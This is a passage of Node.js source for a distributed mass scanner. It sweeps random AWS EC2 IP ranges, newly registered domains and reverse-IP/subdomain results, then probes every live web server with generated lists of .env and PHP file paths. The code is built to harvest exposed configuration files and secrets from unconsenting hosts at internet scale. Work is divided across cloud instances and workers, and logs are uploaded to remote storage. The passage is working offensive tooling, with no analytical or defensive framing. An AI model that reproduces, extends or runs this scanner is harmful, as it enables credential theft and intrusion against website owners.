    // FASE 2 — Retry HTTPS: concorrenza limitata
    if (retryList.length > 0) {
      log(`[CHK] Retrying ${retryList.length} URLs in HTTPS...`);
      const retryResults = await asyncPool(PROBE_CONCURRENCY, retryList, ({ retryUrl }) =>
        ax.get(retryUrl, { timeout: 3000, responseType: 'stream' })
      );
      for (let j = 0; j < retryResults.length; j++) {
        const r = retryResults[j];
        if (r.status !== 'fulfilled' || !r.value) continue;
        const res = r.value;
        try { res.data.destroy(); } catch (_) {}
        if ([200, 403, 206].includes(res.status)) {
          const siteUrl = retryList[j].retryUrl;
          if (!hostsBySite[siteUrl]) {
            hostsBySite[siteUrl] = {
              env: [...generateEnvBatches(siteUrl)],
              php: [...generatePhpBatches(siteUrl)],
            };
          }
        }
      }
    }

    // FASE 3 — Scan siti vivi, max SCAN_SITE_CONCURRENCY in parallelo
    const siteEntries = Object.entries(hostsBySite);
    if (siteEntries.length > 0) {
      log(`[CHK] Scanning ${siteEntries.length} live sites (concurrency=${SCAN_SITE_CONCURRENCY})...`);
      await asyncPool(SCAN_SITE_CONCURRENCY, siteEntries, ([siteUrl]) =>
        scanSite(siteUrl, isFallback)
      );
      log(`  [CHK] All ${siteEntries.length} sites scanned.`);
    } else {
      log(`  [CHK] No live sites found in this block.`);
    }
  }
}

// ================================================================
// REVERSE IP + SUBDOMAINS
// ================================================================
// Helper: process a list of domains in batches, respecting SCAN_SITE_CONCURRENCY.
// Each batch probes & scans fully before the next batch starts.
async function processUrlsBatched(urlsList, isFallback, label) {
  if (urlsList.length === 0) return;
  const batchSize = SCAN_SITE_CONCURRENCY;
  for (let i = 0; i < urlsList.length; i += batchSize) {
    const batch = urlsList.slice(i, i + batchSize);
    if (i > 0) log(`  [REV] ${label} — batch ${Math.floor(i/batchSize)+1}/${Math.ceil(urlsList.length/batchSize)}...`);
    await processUrls(batch, isFallback)
      .catch(e => log(`  [REV] Error scanning ${label}: ${e.message}`));
  }
}

async function doReverseAndSubdomains(siteLink, isFallback) {
  if (!USE_REV || isFallback) return;

  let hostxxx;
  try { hostxxx = new URL(siteLink).hostname; } catch (_) { return; }
  if (!hostxxx) return;
  if (hostxxx.startsWith('www.')) hostxxx = hostxxx.slice(4);

  // Check if IP
  const ipRegex = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;
  const isIp = ipRegex.test(hostxxx);

  if (isIp) {
    const domains = await reverseIpLookup(hostxxx);
    if (domains && domains.length > 0) {
      const filtered = domains.filter(d => d.toLowerCase().replace(/\/+$/, '') !== hostxxx.toLowerCase());
      if (filtered.length > 0) {
        log(`  [REV] IP ${hostxxx} — found ${filtered.length} domains (processing ${SCAN_SITE_CONCURRENCY} at a time)`);
        for (const d of filtered) log(`    [REV] => ${d}`);
        await processUrlsBatched(filtered, true, `IP ${hostxxx}`);
      } else {
        log(`  [REV] IP ${hostxxx} — filtered (all self-referential)`);
      }
    } else {
      log(`  [REV] IP ${hostxxx} — no domains found`);
    }
  } else {
    // Domain: subdomains first
    const parts = hostxxx.split('.');
    const targetDomain = parts.length > 2 ? parts.slice(-2).join('.') : hostxxx;
    log(`  [REV] Searching subdomains for ${targetDomain}...`);
    let domains = await findSubdomains(targetDomain);
    if (domains && domains.length > 0) {
      domains = domains.filter(d => d.toLowerCase().replace(/\/+$/, '') !== hostxxx.toLowerCase());
      if (domains.length > 0) {
        log(`  [REV] Domain ${targetDomain} — found ${domains.length} subdomains (processing ${SCAN_SITE_CONCURRENCY} at a time)`);
        for (const d of domains) log(`    [REV] => ${d}`);
        await processUrlsBatched(domains, true, `subdomains of ${targetDomain}`);
      }
    } else {
      // Fallback: reverse DNS
      log(`  [REV] No subdomains, trying reverse IP for ${hostxxx}...`);
      try {
        const addresses = await dns.promises.resolve4(hostxxx);
        if (addresses.length > 0) {
          const targetIp = addresses[0];
          let revDomains = await reverseIpLookup(targetIp);
          if (revDomains && revDomains.length > 0) {
            revDomains = revDomains.filter(d => d.toLowerCase().replace(/\/+$/, '') !== hostxxx.toLowerCase());
            if (revDomains.length > 0) {
              log(`  [REV] IP ${targetIp} — found ${revDomains.length} domains (processing ${SCAN_SITE_CONCURRENCY} at a time)`);
              for (const d of revDomains) log(`    [REV] => ${d}`);
              await processUrlsBatched(revDomains, true, `reverse IP ${targetIp}`);
            }
          }
        }
      } catch (e) {
        log(`  [REV] DNS failed for ${hostxxx}: ${e.message}`);
      }
    }
  }
}

// ================================================================
// AWS CIDR SCANNER
// ================================================================
async function fetchAwsIps() {
  log('[AWS FETCH] Loading CIDRs from pack.json...');
  const cidrs = packCfg.prefixes || [];
  if (cidrs.length === 0) throw new Error('No prefixes found in pack.json');
  log(`[AWS FETCH] ${cidrs.length} total prefixes in pack.json`);
  return { prefixes: cidrs };
}

function getEc2Cidrs(data) {
  return (data.prefixes || [])
    .filter(p => p.service === 'EC2')
    .map(p => ({ cidr: p.ip_prefix, region: p.region }));
}

function buildCidrPool(cidrs) {
  const sources = [];
  let skipped = 0;
  for (const { cidr, region } of cidrs) {
    try {
      const parts = cidr.split('/');
      const prefix = parseInt(parts[1]);
      // Keep /10 - /13 (524K - 4M IPs)
      if (prefix < 10 || prefix > 17) { skipped++; continue; }
      const total = Math.pow(2, 32 - prefix);
      const ipParts = parts[0].split('.').map(Number);
      const first = (ipParts[0] << 24) | (ipParts[1] << 16) | (ipParts[2] << 8) | ipParts[3];
      // Align to network
      const mask = ~((1 << (32 - prefix)) - 1) >>> 0;
      const firstAligned = (first & mask) >>> 0;
      sources.push({ cidr, first: firstAligned, total, region, prefix });
    } catch (_) {}
  }
  log(`[AWS POOL] ${sources.length} CIDRs /11-/13 (skipped ${skipped} other prefixes)`);
  return sources;
}

function ipFromInt(n) {
  return `${(n >>> 24) & 0xFF}.${(n >>> 16) & 0xFF}.${(n >>> 8) & 0xFF}.${n & 0xFF}`;
}

let _dnsFailCnt = 0, _nonEc2Cnt = 0, _tcpFailCnt = 0, _tcpOkCnt = 0;

async function verifyEc2Webserver(ip) {
  try {
    const hostnames = await dns.promises.reverse(ip);
    const hostname = (hostnames[0] || '').toLowerCase();
    if (!hostname) {
      if (++_nonEc2Cnt <= 3) log(`[VERIFY] NO-HOSTNAME ${ip}`);
      return null;
    }

    for (const [port, proto] of [[443, 'https'], [80, 'http']]) {
      try {
        await new Promise((resolve, reject) => {
          const sock = new (port === 443 ? tls : net).Socket();
          sock.setTimeout(DNS_TIMEOUT_EC2 * 1000);
          sock.connect(port, hostname, () => { sock.destroy(); resolve(); });
          sock.on('error', reject);
          sock.on('timeout', () => { sock.destroy(); reject(new Error('timeout')); });
        });
        if (++_tcpOkCnt <= 3) log(`[VERIFY] TCP OK ${hostname}:${port}`);
        return `${proto}://${hostname}`;
      } catch (_) {}
    }
    if (++_tcpFailCnt <= 3) log(`[VERIFY] TCP FAIL ${hostname} (80 & 443 unreachable)`);
    return null;
  } catch (e) {
    if (++_dnsFailCnt <= 3) log(`[VERIFY] DNS FAIL ${ip}: ${e.message}`);
    return null;
  }
}

async function gatherAndScanCycle(cidrPool, workerId, numWorkers, cycleNum, instanceId, totalInstances, workerSeenUrls) {
  // Deterministic CIDR assignment: each instance gets non-overlapping CIDRs via round-robin.
  // instanceId=0 gets CIDRs [0..8], instanceId=1 gets [9..17], etc.
  // On next cycle, each instance advances by NUM_CIDR_PER_CYCLE * totalInstances (wrapping).
  const poolSize = cidrPool.length;
  const startIdx = (instanceId * NUM_CIDR_PER_CYCLE + cycleNum * NUM_CIDR_PER_CYCLE * totalInstances) % poolSize;
  const chosenCidrs = [];
  for (let i = 0; i < Math.min(NUM_CIDR_PER_CYCLE, poolSize); i++) {
    chosenCidrs.push(cidrPool[(startIdx + i) % poolSize]);
  }

  // Proportional split: larger CIDRs get more IPs, smaller ones fewer.
  // Each CIDR's quota is weighted by its total IP count relative to the batch.
  const numCidrs = chosenCidrs.length;
  const totalSize = chosenCidrs.reduce((sum, c) => sum + c.total, 0);
  const quotas = [];
  let assigned = 0;
  for (let c = 0; c < numCidrs; c++) {
    if (c === numCidrs - 1) {
      quotas.push(TOTAL_IPS_PER_CYCLE - assigned);
    } else {
      // Proportional weight, but minimum 1
      const weight = chosenCidrs[c].total / totalSize;
      let q = Math.max(1, Math.round(weight * TOTAL_IPS_PER_CYCLE));
      // Don't exceed remaining budget
      const maxLeft = TOTAL_IPS_PER_CYCLE - assigned - (numCidrs - c - 1);
      q = Math.min(q, maxLeft);
      quotas.push(q);
      assigned += q;
    }
  }
  // No need to shuffle — order is already random (CIDRs were picked round-robin)

  if (workerId === 0) {
    const details = chosenCidrs.map((c, i) => `${c.cidr}:${quotas[i]}`).join(', ');
    log(`[AWS GATHER #${cycleNum}] Instance ${instanceId}/${totalInstances} — ${numCidrs} CIDRs, ${TOTAL_IPS_PER_CYCLE} IPs split: ${details}`);
  }

  // Deterministic IP ranges per instance within each CIDR — ZERO overlap between instances.
  // Each CIDR IP space is split into totalInstances equal chunks; instance k gets chunk k.
  const allIps = [];
  for (let c = 0; c < numCidrs; c++) {
    const { first, total, region } = chosenCidrs[c];
    const chunkSize = Math.floor(total / totalInstances);
    const rangeStart = instanceId * chunkSize;
    const rangeEnd = (instanceId === totalInstances - 1) ? total : (instanceId + 1) * chunkSize;
    const rangeLen = rangeEnd - rangeStart;
    const take = Math.min(quotas[c], rangeLen);
    if (take <= 0) continue;
    // Pick take consecutive IPs from a random starting offset within this instance's range
    const startOff = Math.floor(Math.random() * rangeLen);
    for (let k = 0; k < take; k++) {
      const off = rangeStart + ((startOff + k) % rangeLen);
      allIps.push({ ip: ipFromInt(first + off), region });
    }
  }

  // Shuffle all
  for (let i = allIps.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [allIps[i], allIps[j]] = [allIps[j], allIps[i]];
  }

  // Split among workers (round-robin)
  const myIps = allIps.filter((_, i) => i % numWorkers === workerId);
  for (let i = myIps.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [myIps[i], myIps[j]] = [myIps[j], myIps[i]];
  }

  if (workerId === 0) {
    log(`[AWS GATHER #${cycleNum}] ${allIps.length} IPs total, split among ${numWorkers} workers (~${Math.floor(allIps.length / numWorkers)} each)`);
  }

  const seenUrls = new Set();
  let hits = 0, processed = 0, lastPct = -1;
  const totalMy = myIps.length;

  // Process in chunks
  for (let i = 0; i < myIps.length; i += DNS_WORKERS_EC2) {
    const chunk = myIps.slice(i, i + DNS_WORKERS_EC2);
    const results = await Promise.allSettled(chunk.map(({ ip }) =>
      verifyEc2Webserver(ip)
    ));

    for (const r of results) {
      processed++;
      if (r.status === 'fulfilled' && r.value && !seenUrls.has(r.value)) {
        seenUrls.add(r.value);
        hits++;
      }
    }

    const pct = Math.floor(processed * 100 / totalMy);
    if (pct >= lastPct + 10) {
      lastPct = pct - (pct % 10);
      log(`[W${workerId} GATHER #${cycleNum}] ${pct}% (${processed}/${totalMy}) — ${hits} webservers, ${processed - hits} discarded`);
    }
  }

  // Per-worker dedup — each worker has its own Set, race-free
  const urls = [];
  for (const u of seenUrls) {
    if (!workerSeenUrls.has(u)) {
      workerSeenUrls.add(u);
      urls.push(u);
    }
  }
  for (let i = urls.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [urls[i], urls[j]] = [urls[j], urls[i]];
  }

  log(`[W${workerId} GATHER #${cycleNum}] Phase 1: ${hits} webservers, ${processed - hits} discarded out of ${totalMy} IPs`);

  if (urls.length === 0) {
    log(`[W${workerId}] No URLs found. Skipping scan.`);
    return;
  }

  // Processa TUTTI gli URL in un colpo (stile grequests.map)
  log(`[W${workerId}] Phase 2 — Scanning ${urls.length} verified URLs...`);
  await processUrls(urls).catch(e => log(`[W${workerId}] Phase 2 — Error: ${e.message}`));
  log(`[W${workerId}] Phase 2 completed (${urls.length} URLs).`);
}

// ================================================================
// MAIN — WORKER LOOP
// ================================================================

// Pool CIDR condiviso (costruito una volta sola, read-only dopo init + refresh)
let cidrPoolShared = null;

async function initCidrPool() {
  if (!LOAD_FROM_CIDR) return null;
  try {
    const awsData = await fetchAwsIps();
    const ec2Cidrs = getEc2Cidrs(awsData);
    if (ec2Cidrs.length === 0) {
      log('[SYS] No EC2 CIDRs found.');
      return null;
    }
    log(`[SYS] Found ${ec2Cidrs.length} EC2 CIDRs. Building pool...`);
    return buildCidrPool(ec2Cidrs);
  } catch (e) {
    log(`[SYS] ERROR fetching AWS IPs: ${e.message}`);
    return null;
  }
}

async function workerLoop(workerId) {
  let cycle = 0;
  let cidrCycleCount = 0;                              // per-worker, nessuna race
  const workerSeenUrls = new Set();                     // per-worker, nessuna race

  while (true) {
    cycle++;

    // Phase SITE
    if (LOAD_FROM_SITE) {
      let filesProcessed = 0;
      while (true) {
        const { targets, filepath } = await loadSitesFromFolder(workerId, NUM_WORKERS);
        if (targets.length === 0) {
          if (filesProcessed > 0) {
            log(`[SITE] Worker ${workerId} — All files processed (${filesProcessed} files).`);
          } else {
            log(`[SITE] Worker ${workerId} — No .txt files in site/. Waiting...`);
          }
          break;
        }
        const fname = path.basename(filepath);
        log(`[SITE] Worker ${workerId} — Scanning ${fname}: ${targets.length} targets`);
        await processUrls(targets).catch(e => log(`[SITE] Error scanning ${fname}: ${e.message}`));
        await deleteSiteFile(filepath);
        filesProcessed++;
      }
    }

    // Phase WHOISDS — newly registered domains, one day per instance
    if (LOAD_FROM_WHOISDS) {
      let whoisdsCycle = 0;
      while (true) {
        const { targets, filepath, done } = await loadSitesFromWhoisDS(whoisdsCycle);
        if (targets.length === 0) {
          if (done) {
            log(`[WHOISDS] Instance ${INSTANCE_ID} — Day completed. Advancing to next day...`);
            whoisdsCycle++;  // next cycleOffset -> next day
            // Small sleep to avoid hammering the same day's download
            await sleep(5000);
            continue;
          }
          break;
        }
        log(`[WHOISDS] Scanning ${targets.length.toLocaleString()} domains from chunk...`);
        await processUrls(targets).catch(e => log(`[WHOISDS] Error: ${e.message}`));
        // Continua con lo stesso giorno, prossimo chunk
      }
      // Se finisce tutti i giorni, continua il loop (CIDR phase)
      log(`[WHOISDS] Instance ${INSTANCE_ID} — Finished all ${WHOISDS_DAYS} days.`);
    }

    // Phase CIDR
    if (LOAD_FROM_CIDR && cidrPoolShared) {
      cidrCycleCount++;
      // Solo worker 0 refresha il pool condiviso (evita refresh duplicati + race su var condivisa)
      if (workerId === 0 && cidrCycleCount % POOL_REFRESH_CYCLES === 0) {
        log(`[SYS] Refreshing CIDR pool (cycle #${cycle})...`);
        const newPool = await initCidrPool();
        if (newPool) {
          cidrPoolShared = newPool;
          log(`[SYS] CIDR pool refreshed: ${cidrPoolShared.length} CIDRs`);
        }
      }

      try {
        await gatherAndScanCycle(cidrPoolShared, workerId, NUM_WORKERS, cycle, INSTANCE_ID, TOTAL_SLOTS, workerSeenUrls);
        log(`[W${workerId}] Cycle #${cycle} completed.`);
      } catch (e) {
        log(`[W${workerId}] Cycle #${cycle} crashed: ${e.message}. Restarting next cycle...`);
      }
    }

    // Exit conditions
    if (LOAD_FROM_SITE && !LOAD_FROM_CIDR && !LOAD_FROM_WHOISDS) {
      log(`[SYS] Worker ${workerId} — Done. No CIDR/WhoisDS active, exiting.`);
      break;
    }
    if (!LOAD_FROM_SITE && !LOAD_FROM_CIDR && !LOAD_FROM_WHOISDS) break;

    await sleep(2000);
  }
}

// ================================================================
// LOG UPLOAD LOOP
// ================================================================
function startLogUploadLoop() {
  setInterval(() => {
    uploadLog().catch(() => {});
  }, LOG_UPLOAD_INTERVAL * 1000);
}

// ================================================================
// ENTRY POINT
// ================================================================
let _tee = null; // ref per graceful shutdown

async function main() {
  if (LOG_ACTIVE) {
    await fs.promises.mkdir(LOGS_DIR, { recursive: true });
    const containerId = process.env.HOSTNAME || `local_${Math.floor(Date.now() / 1000)}`;
    LOG_PATH = path.join(LOGS_DIR, `${containerId}.log`);
    _tee = new TeeLogger(LOG_PATH);
    console.log = (...args) => {
      const msg = args.map(a => typeof a === 'string' ? a : JSON.stringify(a)).join(' ') + '\n';
      _tee.write(msg);
    };
    console.error = console.log;

    // Flush log su SIGTERM/SIGINT (Docker stop, Ctrl+C)
    const shutdown = (sig) => {
      console.log(`[SYS] Received ${sig}, flushing logs...`);
      _tee.destroy();
      process.exit(0);
    };
    process.on('SIGTERM', () => shutdown('SIGTERM'));
    process.on('SIGINT', () => shutdown('SIGINT'));
  }

  log('\n[SYS] Cloud worker starting...');
  if (LOG_ACTIVE) log(`[SYS] Log saved to: ${LOG_PATH}`);

  await fs.promises.mkdir(RESULT_DIR, { recursive: true });
  await fs.promises.mkdir(NEW_PATH_EXTRACT, { recursive: true });

  log(`[SYS] AWS_S3=${AWS_S3}  BUNNY_STORAGE=${BUNNY_STORAGE}`);
  log(`[SYS] LOAD_FROM_SITE=${LOAD_FROM_SITE}  LOAD_FROM_CIDR=${LOAD_FROM_CIDR}  LOAD_FROM_WHOISDS=${LOAD_FROM_WHOISDS}`);
  log(`[SYS] ${NUM_CIDR_PER_CYCLE} CIDRs/cycle (/10-/17), ${TOTAL_IPS_PER_CYCLE} total IPs/cycle, ${NUM_WORKERS} workers`);

  if (!LOAD_FROM_SITE && !LOAD_FROM_CIDR && !LOAD_FROM_WHOISDS) {
    log('[SYS] ERROR: No target source enabled (SITE/CIDR/WHOISDS all false). Exiting.');
    return;
  }

  log(`[SYS] Starting ${NUM_WORKERS} worker(s)`);
  startLogUploadLoop();

  // Costruisci pool CIDR una volta sola (condiviso tra tutti i worker)
  cidrPoolShared = await initCidrPool();
  if (LOAD_FROM_CIDR && !cidrPoolShared) {
    log('[SYS] ERROR: LOAD_FROM_CIDR=true but no CIDRs available. Exiting.');
    return;
  }

  const workers = [];
  for (let w = 0; w < NUM_WORKERS; w++) {
    workers.push(workerLoop(w).catch(e => log(`[SYS] Worker ${w} crashed: ${e.message}`)));
  }

  await Promise.all(workers);
  log('[SYS] All workers finished.');
}

if (require.main === module) {
  main().catch(e => {
    console.error(`[FATAL] ${e.message}`, e.stack);
    process.exit(1);
  });
}
